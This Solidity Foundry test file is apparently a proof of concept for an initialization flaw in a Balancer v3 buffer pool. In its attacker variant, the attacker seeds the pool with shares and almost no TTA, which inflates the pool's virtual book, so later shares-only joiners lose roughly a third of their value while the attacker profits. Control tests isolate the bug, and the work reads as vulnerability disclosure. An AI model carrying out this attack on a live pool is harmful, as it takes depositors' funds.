// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {Math} from "@crane/contracts/utils/Math.sol";
import {IStandardExchangeBufferPool} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/standardExchange/IStandardExchangeBufferPool.sol";
import {TestBase_StandardExchangeBufferPool} from
    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";

interface IFzNative {
    function previewExchangeIn(IERC20 in_, uint256 amount_, IERC20 out_) external view returns (uint256 amountOut, uint256 amountRefunded);
    function exchangeIn(IERC20 in_, uint256 amount_, IERC20 out_, uint256 min_, address to_, bool prepaid_, uint256 deadline_)
        external
        returns (uint256 amountOut, uint256 amountRefunded);
}

interface IFzAero {
    function getReserves() external view returns (uint256, uint256, uint256);
    function totalSupply() external view returns (uint256);
}

interface IFzRP {
    function getRate() external view returns (uint256);
}

/// Shared helpers.
abstract contract FzBase is TestBase_StandardExchangeBufferPool {
    IStandardExchangeBufferPool internal p;
    uint256 internal fsv0; // fair share value frozen at start of the scenario

    /// Fair (manipulation-resistant) DAI value of 1 SE share: LP backing x 2*sqrt(r0*r1)/LPsupply.
    function _fsv() internal view returns (uint256) {
        uint256 sup = IERC20(address(seVault)).totalSupply();
        uint256 lpBal = IERC20(address(aeroDaiUsdcPool)).balanceOf(address(seVault));
        (uint256 r0, uint256 r1,) = IFzAero(address(aeroDaiUsdcPool)).getReserves();
        uint256 lpSup = IFzAero(address(aeroDaiUsdcPool)).totalSupply();
        return Math.mulDiv(Math.mulDiv(lpBal, 2 * Math.sqrt(r0 * r1), lpSup), 1e18, sup);
    }

    function _rate() internal view returns (uint256) {
        return IFzRP(address(seRateProvider)).getRate();
    }

    function _val(uint256 ttaAmt, uint256 shAmt, uint256 fsv) internal pure returns (uint256) {
        return ttaAmt + Math.mulDiv(shAmt, fsv, 1e18);
    }

    function _raw(uint256 idx) internal view returns (uint256) {
        (,, uint256[] memory raw,) = bv3Vault.getPoolTokenInfo(bufferPool);
        return raw[idx];
    }

    function _logPool(string memory tag) internal view {
        console2.log(tag);
        console2.log("  live raw TTA   ", _raw(p.ttaIndex()));
        console2.log("  live raw shares", _raw(p.sharesIndex()));
        console2.log("  virtualTTA     ", p.virtualTTA());
        console2.log("  hookSharesDelta", p.hookSharesDelta());
        console2.log("  BPT supply     ", bv3Vault.totalSupply(bufferPool));
        console2.log("  rate / fsv     ", _rate(), _fsv());
    }

    function _approveAll(address u) internal {
        vm.startPrank(u);
        IERC20(address(seVault)).approve(bufferPool, type(uint256).max);
        IERC20(address(seVault)).approve(address(router), type(uint256).max);
        IERC20(address(dai)).approve(address(router), type(uint256).max);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
        address[3] memory toks = [address(seVault), address(dai), bufferPool];
        for (uint256 i; i < 3; ++i) {
            IERC20(toks[i]).approve(address(permit2), type(uint256).max);
            permit2.approve(toks[i], address(router), type(uint160).max, type(uint48).max);
        }
        vm.stopPrank();
    }

    /// Honest shares-only join through the pool's own native SE entry point, slippage bound = preview.
    function _nativeSharesJoin(address u, uint256 S) internal returns (uint256 bpt) {(uint256 q,) = IFzNative(bufferPool).previewExchangeIn(IERC20(address(seVault)), S, IERC20(bufferPool));
        vm.prank(u);(bpt,) = IFzNative(bufferPool).exchangeIn(IERC20(address(seVault)), S, IERC20(bufferPool), q, u, false, block.timestamp
        );
        assertEq(bpt, q, "preview != exec");
    }

    /// Proportional exit of the whole BPT balance; returns (tta, shares) received.
    function _exitAll(address u) internal returns (uint256 t, uint256 s) {
        uint256 bal = IERC20(bufferPool).balanceOf(u);
        uint256 t0 = tta.balanceOf(u);
        uint256 s0 = shares.balanceOf(u);
        removeLiquidityProportional(u, bal, 0, 0);
        t = tta.balanceOf(u) - t0;
        s = shares.balanceOf(u) - s0;
    }

    /// Value (fsv0) a holder would get from a proportional exit right now (snapshot/revert).
    function _exitValue(address u) internal returns (uint256 v) {
        uint256 snap = vm.snapshotState();
        (uint256 t, uint256 s) = _exitAll(u);
        v = _val(t, s, fsv0);
        vm.revertToState(snap);
    }
}

/// Variant A: the project's own fixture init (alice seeds equal raw TTA and shares).
/// An honest shares-only joiner loses ~27%, the honest initial LP gains it.
contract FzSharesOnlyJoin_FixtureInit is FzBase {
    function setUp() public override {
        super.setUp();
        p = IStandardExchangeBufferPool(bufferPool);
    }

    function test_fixtureInit_honestSharesOnlyJoin_loses() public {
        fsv0 = _fsv();
        _logPool("fixture init state");
        address carol = makeAddr("carol");
        _approveAll(carol);
        uint256 S = mintShares(carol, 100e18);
        uint256 aliceBefore = _exitValue(alice);

        uint256 bpt = _nativeSharesJoin(carol, S);
        uint256 vin = _val(0, S, fsv0);
        (uint256 t, uint256 s) = _exitAll(carol);
        uint256 vout = _val(t, s, fsv0);
        uint256 aliceAfter = _exitValue(alice);

        console2.log("carol shares in / bpt", S, bpt);
        console2.log("carol value in  (fsv)", vin);
        console2.log("carol value out (fsv)", vout);
        console2.log("carol loss bps", (vin - vout) * 10_000 / vin);
        console2.log("alice exit value before/after", aliceBefore, aliceAfter);
        assertGt((vin - vout) * 10_000 / vin, 2000, "joiner loss < 20%");
        assertGt(aliceAfter, aliceBefore, "incumbent did not gain");
    }

    /// Control: a proportional join + exit round trip is ~lossless.
    function test_control_proportionalJoin() public {
        fsv0 = _fsv();
        address carol = makeAddr("carolP");
        _approveAll(carol);
        uint256 S = mintShares(carol, 100e18);
        mintTTA(carol, 200e18);
        uint256 supply = bv3Vault.totalSupply(bufferPool);
        uint256 bptOut = supply * S / _raw(p.sharesIndex()) * 99 / 100;
        uint256 t0 = tta.balanceOf(carol);
        uint256 s0 = shares.balanceOf(carol);
        uint256[] memory ins = addLiquidityProportional(carol, bptOut, type(uint128).max, type(uint128).max);
        uint256 vin = _val(ins[p.ttaIndex()], ins[p.sharesIndex()], fsv0);
        (uint256 t, uint256 s) = _exitAll(carol);
        uint256 vout = _val(t, s, fsv0);
        console2.log("control prop vin/vout", vin, vout);
        assertApproxEqRel(vout, vin, 1e15, "proportional round trip not ~lossless");
        t0; s0;
    }
}

/// Variant B: attacker deploys/initializes the canonical (seVault, TTA) pool with shares and
/// ~no TTA. virtualTTA is seeded from the SHARES value, so the BPT book is ~2x the real backing.
/// Honest native shares-only joiners pay at the virtual book; attacker exits proportionally with
/// a large part of their deposit.
contract FzSharesOnlyJoin_AttackerInit is FzBase {
    address internal attacker;
    uint256 internal attShares0;
    uint256 internal attTta0;
    address[3] internal vs;
    uint256[3] internal vS;
    uint256 internal constant ATT_TTA_SEED = 1e18;

    /// TTA the initializer seeds. Attacker: ~nothing. Control subclass: value-balanced.
    function _ttaSeed(uint256 /*S*/) internal view virtual returns (uint256) {
        return ATT_TTA_SEED;
    }

    function _minVictimLossBps() internal pure virtual returns (uint256) {
        return 3000;
    }

    function _initPool() internal override {
        // Honest victims acquire their SE shares up front (so the SE rate provider is not moved
        // by share minting during the scenario; isolates this bug from rate-provider drift).
        vs = [makeAddr("carol"), makeAddr("dave"), makeAddr("erin")];
        uint256[3] memory amt = [uint256(500e18), 250e18, 1_000e18];
        for (uint256 i; i < 3; ++i) vS[i] = mintShares(vs[i], amt[i]);
        attacker = makeAddr("attacker");
        // Attacker buys shares the honest way (DAI+USDC -> Aerodrome LP -> SE deposit): ~2000 DAI fair.
        uint256 S = mintShares(attacker, 1_000e18);
        uint256 seed = _ttaSeed(S);
        mintTTA(attacker, seed);
        attShares0 = S;
        attTta0 = seed;
        p = IStandardExchangeBufferPool(bufferPool);
        _approveAll(attacker);
        (IERC20[] memory poolTokens,,,) = bv3Vault.getPoolTokenInfo(bufferPool);
        uint256[] memory amounts = new uint256[](2);
        amounts[p.sharesIndex()] = S;
        amounts[p.ttaIndex()] = seed;
        vm.prank(attacker);
        router.initialize(bufferPool, poolTokens, amounts, 0, false, bytes(""));
    }

    function setUp() public override {
        super.setUp();
        p = IStandardExchangeBufferPool(bufferPool);
    }

    function test_attackerInit_harvestsSharesOnlyJoiners() public {
        fsv0 = _fsv();
        uint256 rate0 = _rate();
        _logPool("attacker-initialized state");
        uint256 attV0 = _val(attTta0, attShares0, fsv0);

        // Honest victims join with shares through the pool's native entry (slippage = preview).
        uint256 totalVin;
        uint256[3] memory vin;
        for (uint256 i; i < 3; ++i) {
            _approveAll(vs[i]);
            uint256 S = vS[i];
            vin[i] = _val(0, S, fsv0);
            totalVin += vin[i];
            uint256 bpt = _nativeSharesJoin(vs[i], S);
            console2.log("victim shares in / bpt", S, bpt);
        }
        _logPool("after victim joins");

        // Attacker exits first, proportionally.
        (uint256 at, uint256 ash) = _exitAll(attacker);
        uint256 attV1 = _val(at, ash, fsv0);
        // Victims exit proportionally.
        uint256 totalVout;
        for (uint256 i; i < 3; ++i) {
            (uint256 t, uint256 s) = _exitAll(vs[i]);
            uint256 vo = _val(t, s, fsv0);
            totalVout += vo;
            console2.log("victim value in / out (fsv)", vin[i], vo);
            console2.log("victim loss bps", (vin[i] - vo) * 10_000 / vin[i]);
        }
        console2.log("attacker value before (fsv)", attV0);
        console2.log("attacker value after  (fsv)", attV1);
        console2.log("attacker PROFIT (fsv)", int256(attV1) - int256(attV0));
        console2.log("attacker PROFIT (rate)", int256(_val(at, ash, rate0)) - int256(_val(attTta0, attShares0, rate0)));
        console2.log("victims total LOSS (fsv)", totalVin - totalVout);
        console2.log("victims total LOSS bps", (totalVin - totalVout) * 10_000 / totalVin);
        _assertOutcome(attV0, attV1, totalVin, totalVout);
    }

    function _assertOutcome(uint256 attV0, uint256 attV1, uint256 totalVin, uint256 totalVout) internal virtual {
        assertGt(attV1, attV0, "no attacker profit");
        assertGt((totalVin - totalVout) * 10_000 / totalVin, _minVictimLossBps(), "victim loss below threshold");
    }
}

/// Control for variant B: identical flow, but the initializer seeds value-balanced TTA
/// (raw TTA == shares * rate, i.e. live TTA == virtualTTA). Remaining joiner loss is ordinary
/// weighted-pool single-sided price impact + fee; the difference vs variant B is the bug.
contract FzSharesOnlyJoin_BalancedInitControl is FzSharesOnlyJoin_AttackerInit {
    function _ttaSeed(uint256 S) internal view override returns (uint256) {
        return S * _rate() / 1e18;
    }

    function _assertOutcome(uint256, uint256, uint256 totalVin, uint256 totalVout) internal pure override {
        // ordinary price impact only: well under the bugged ~37%
        assertLt((totalVin - totalVout) * 10_000 / totalVin, 2000, "control loss unexpectedly high");
    }
}
